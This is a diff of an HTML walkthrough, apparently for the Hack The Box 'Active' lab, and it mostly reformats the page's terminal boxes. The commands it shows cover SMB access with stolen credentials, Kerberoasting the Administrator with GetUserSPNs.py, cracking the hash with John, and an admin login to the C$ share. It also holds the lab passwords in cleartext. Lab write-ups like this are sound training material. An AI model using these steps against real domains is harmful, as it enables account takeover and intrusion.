@@ -121,7 +121,9 @@
     <div class="terminal-box">smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
     </div>
     <p>Or with this command.</p>
-    <div class="terminal-box">smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+    <div class="terminal-box">
+    smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18 
+        
     smb: \SVC_TGS\desktop\> get user.txt
     </div>
     
@@ -137,17 +139,16 @@
     <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100</div>
 
     <p>I dumped a Service Principal Name (SPN) tied to administrator, which means I can roast the Administrator's TGS  Kerberos service ticket .</p>
-   <div class="terminal-box">active/CIFS:445
-    Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
-    2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571 
-   </div>
+   <div class="terminal-box">active/CIFS:445 Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 22:06:40.351723  2025-06-09 20:33:56.672571</div>
 
    <p>I want to extract the Administrator's hash, and I use the '-request' flag.</p>
    <div class="terminal-box">GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request</div>
    <p>Where I get this response :</p>
    <img src="/pngs/HTB/Easy/Active/Pasted%20image%2020250610001134.png">
    <p>I cracked the hash by using John The Ripper tool :</p>
-   <div class="terminal-box">~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
+   <div class="terminal-box">
+    ~/john/run$ ./john --wordlist=/usr/share/wordlists/rockyou.txt ~/admin.hash
+       
     Ticketmaster1968
    </div>
 
@@ -164,7 +165,9 @@
 
     <h3 class="step-header">4. Privilege Escalation - Second way</h3>
     <p>We can use <code>smbmap</code> tool to print us the shares, what permissions we have and to get the flag :</p>
-    <div class="terminal-box">smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+    <div class="terminal-box">
+    smbclient //10.10.10.100/C$ -U active.htb\\administrator%Ticketmaster1968
+        
     smb: \> get \users\administrator\desktop\root.txt
     </div>
 </div>
